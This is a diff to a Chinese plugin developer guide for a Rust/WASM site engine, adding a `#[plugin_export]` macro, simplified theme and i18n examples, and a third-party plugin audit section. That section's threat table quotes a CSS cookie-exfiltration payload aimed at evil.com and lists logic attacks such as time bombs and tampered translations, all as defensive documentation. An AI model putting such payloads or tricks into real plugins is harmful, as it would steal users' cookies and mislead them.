@@ -57,35 +57,59 @@ members = [
 ]
 ```
 
+## 3.0 为什么看不到 `unsafe`？（Phase 9.1）
+
+`#[plugin_export]` 是一个 proc macro（`crates/sdk-macros`），把一个 safe
+Rust fn 自动包装成 `unsafe extern "C" fn ... -> u64` 的 WASM ABI 入口。展开后
+等价于以下手写 boilerplate：
+
+```rust
+// 你写的：
+#[plugin_export]
+fn get_theme_css() -> &'static str { THEME_CSS }
+
+// 宏展开为（简化）：
+fn __plugin_inner_get_theme_css() -> &'static str { THEME_CSS }
+
+#[no_mangle]
+pub unsafe extern "C" fn get_theme_css(ptr: *mut u8, len: usize) -> u64 {
+    let _ = (ptr, len);
+    let result = __plugin_inner_get_theme_css();
+    sdk::pack_output(result.as_bytes().to_vec())
+}
+```
+
+宏支持 0 或 1 参数；返回类型按 syntax 自动分派：
+- `String` / `&str` → `pack_output(bytes)`
+- `Vec<u8>` → `pack_output`
+- 任何 `Serialize` 类型（含 `PluginManifest`）→ `pack_json(&v)`
+
+不支持 `Result<T, E>`（v1）；错误请在 fn 内自己编码进返回 JSON。
+不支持 async / unsafe / method —— 编译期报错。
+
 ## 3. 最小可行实现（主题插件）
 
 `crates/plugins/theme-purple/src/lib.rs`：
 
 ```rust
-use sdk::{alloc, capabilities, pack_json, PluginManifest};
-use std::slice;
+use sdk::{capabilities, plugin_export, PluginManifest};
 
-#[no_mangle]
-pub unsafe extern "C" fn get_manifest(_ptr: *mut u8, _len: usize) -> u64 {
-    let m = PluginManifest::new(
-        "theme-purple",
-        "Theme Purple",
-        env!("CARGO_PKG_VERSION"),
-    )
-    .with_capability(capabilities::THEME)
-    .with_description("紫罗兰主题（示例）")
-    .with_author("yuxuetr");
-    pack_json(&m)
+#[plugin_export]
+fn get_manifest() -> PluginManifest {
+    PluginManifest::new("theme-purple", "Theme Purple", env!("CARGO_PKG_VERSION"))
+        .with_capability(capabilities::THEME)
+        .with_description("紫罗兰主题（示例）")
+        .with_author("yuxuetr")
 }
 
 const THEME_CSS: &str = r#"
 :root {
-  --color-primary: #7c3aed;        /* violet-600 */
-  --color-bg: #faf5ff;             /* violet-50 */
-  --color-surface: #f3e8ff;        /* violet-100 */
+  --color-primary: #7c3aed;
+  --color-bg: #faf5ff;
+  --color-surface: #f3e8ff;
   --color-text: #1e1b4b;
   --color-text-muted: #4c1d95;
-  --color-border: #ddd6fe;         /* violet-200 */
+  --color-border: #ddd6fe;
 }
 .dark {
   --color-primary: #a78bfa;
@@ -98,17 +122,11 @@ const THEME_CSS: &str = r#"
 body { background-color: var(--color-bg) !important; color: var(--color-text) !important; }
 "#;
 
-#[no_mangle]
-pub unsafe extern "C" fn get_theme_css(_ptr: *mut u8, _len: usize) -> u64 {
-    let bytes = THEME_CSS.as_bytes();
-    let ptr = alloc(bytes.len());
-    let dst = slice::from_raw_parts_mut(ptr, bytes.len());
-    dst.copy_from_slice(bytes);
-    ((ptr as u64) << 32) | (bytes.len() as u64)
-}
+#[plugin_export]
+fn get_theme_css() -> &'static str { THEME_CSS }
 ```
 
-就这样，~25 行实现一个完整主题。
+就这样，~12 行 + 一段 CSS 实现一个完整主题。**视觉上 0 个 unsafe**。
 
 ## 4. 构建
 
@@ -156,26 +174,37 @@ ThemePicker 会自动通过 `list_available_themes` 扫到新插件
 
 ### 6.1 i18n 插件
 
-`get_manifest` 返回 capability=`i18n`，并实现：
+`get_manifest` 返回 capability=`i18n`，并实现 `translate`：
 
 ```rust
-#[no_mangle]
-pub unsafe extern "C" fn translate(ptr: *mut u8, len: usize) -> u64 {
-    use sdk::{pack_output, read_input};
+use sdk::{capabilities, plugin_export, PluginManifest};
+use serde::Deserialize;
 
-    let input = read_input(ptr, len);
-    let req: serde_json::Value = serde_json::from_slice(input).unwrap_or_default();
-    let key = req.get("key").and_then(|v| v.as_str()).unwrap_or("");
-    let lang = req.get("lang").and_then(|v| v.as_str()).unwrap_or("zh");
+#[plugin_export]
+fn get_manifest() -> PluginManifest {
+    PluginManifest::new("i18n-fluent", "i18n Fluent", env!("CARGO_PKG_VERSION"))
+        .with_capability(capabilities::I18N)
+}
 
-    let translation = match (key, lang) {
-        ("nav-blog", "en") => "Blog",
-        ("nav-blog", _)    => "博客",
-        _ => key,
-    };
-    pack_output(translation.as_bytes().to_vec())
+#[derive(Deserialize, Default)]
+struct TranslateRequest {
+    #[serde(default)]
+    key: String,
+    #[serde(default)]
+    lang: String,
+}
+
+#[plugin_export]
+fn translate(req: TranslateRequest) -> String {
+    match (req.key.as_str(), req.lang.as_str()) {
+        ("nav-blog", "en") => "Blog".into(),
+        ("nav-blog", _)    => "博客".into(),
+        _ => req.key,
+    }
 }
 ```
+
+完整带 Fluent 解析的样例见 `crates/plugins/i18n-fluent/src/lib.rs`。
 
 ### 6.2 Auth 插件
 
@@ -301,6 +330,57 @@ ALL_THEMES=(
 
 - [PLUGIN_ABI.md](PLUGIN_ABI.md)：完整 ABI 规范
 - [crates/sdk/src/lib.rs](../crates/sdk/src/lib.rs)：SDK 源码（~200 行，可一口气读完）
+- [crates/sdk-macros/src/lib.rs](../crates/sdk-macros/src/lib.rs)：`#[plugin_export]` 宏实现（~200 行 syn + quote）
 - [crates/plugins/theme-ocean/src/lib.rs](../crates/plugins/theme-ocean/src/lib.rs)：最简单的主题插件实现
+- [crates/plugins/i18n-fluent/src/lib.rs](../crates/plugins/i18n-fluent/src/lib.rs)：用 `#[plugin_export]` 的 i18n 插件
 - [crates/plugins/github-auth/src/lib.rs](../crates/plugins/github-auth/src/lib.rs)：完整 Auth 插件实现
 - [THEME_SPEC.md](THEME_SPEC.md) / [MODERATION_SPEC.md](MODERATION_SPEC.md)：各能力的详细规范
+
+## 12. 如何审计第三方插件（Phase 9.2 / 9.5）
+
+> Fork 这个项目后，如果你接受外部贡献的插件 PR、或从社区安装 `.wasm` 文件，
+> 必须知道宿主自动挡了什么、还要靠你人工 review 什么。
+
+### 12.1 沙箱已挡住的（Phase 8.1 + 9.2，**物理隔离，无需信任**）
+
+| 攻击 | 防线 |
+|---|---|
+| 死循环卡 worker | wasmi `fuel` 上限（默认 100M 指令） + tokio timeout 5s |
+| 爆内存 | wasmi memory page cap（默认 128 页 = 8 MiB） |
+| 输出炸弹（返回 `len = u32::MAX`） | host 在 `vec![0u8; len]` 前 clamp |
+| 偷文件 / 上网 / 读 env | **宿主未暴露任何 host fn**，wasm 物理上做不到（imports 白名单 = ∅，任何 import 即拒） |
+| 文件被偷换 | site.json `plugins_lock` SHA256 比对，不匹配拒绝加载 |
+| capability 伪装（声明 theme 实际偷偷导出 `exchange_code`） | `verify_manifest_consistency` 校验声明 capability 必备 export 齐全 |
+| theme CSS 注入数据外渗（`background:url(http://evil.com/?cookie=...)` 等） | `sanitize_theme_css` 黑名单字符串扫描，命中整段跳过 |
+
+→ 即使第三方插件**全是恶意的**，上述场景在你 fork 的实例里都进不来。
+
+### 12.2 永远检测不了的（**必须人工 review 源码**）
+
+| 攻击 | 为什么检测不了 |
+|---|---|
+| **i18n 翻译篡改**："账户已锁定" → 翻译为"账户安全"误导用户 | wasm 字节码完全合法，逻辑上无法判断对错 |
+| **Auth 插件偷塞额外字段**到 `StandardUser.raw_data`（多塞一个 token） | JSON shape 合法，宿主无法判断字段是否多余 |
+| **时间炸弹**："装好 30 天后开始返错误数据 / 失败拒登" | 沙箱内合法运算，没法静态识别 |
+| **概率性作恶**：每 1000 次调用故意返回错误 1 次 | 单次执行完全正常 |
+
+### 12.3 信任链建议（fork 用户必读）
+
+1. **只信任你自己签名的插件 + 你 review 过 source 的插件**
+   - 仓库内置的 8 个插件（theme-ocean / sunset / catppuccin / i18n-fluent / 4 个 auth）source 都在 `crates/plugins/`
+2. **外部社区插件 PR 流程**：把 source 也加进 `crates/plugins/<name>/`（不只是 `.wasm`）
+   - PR review 必须读完插件 source
+   - merge 后由你的 CI 重新 build 出 `.wasm`，不直接信任 PR 提交者打包的二进制
+3. **`assets/plugins/` 收到第三方 `.wasm`**：拒绝接受
+   - 没有 source 等于黑盒，沙箱挡不住逻辑攻击
+4. **每次发布前跑一遍 lock 工具**重算 SHA256 写回 site.json，挡发布后的文件篡改
+
+### 12.4 如果你想信任更多
+
+未来如果你接受预编译的第三方 `.wasm`（例如做插件市场），需要补：
+
+- Ed25519 detached 签名 + 多公钥 trust list（Phase 9.2 设计有提及但暂未实现）
+- 第三方插件 disclosure + audit 流程
+- Reproducible build（保证 source ↔ wasm 一一对应）
+
+目前 fork 模式下用不到，等真有需求再回头加。
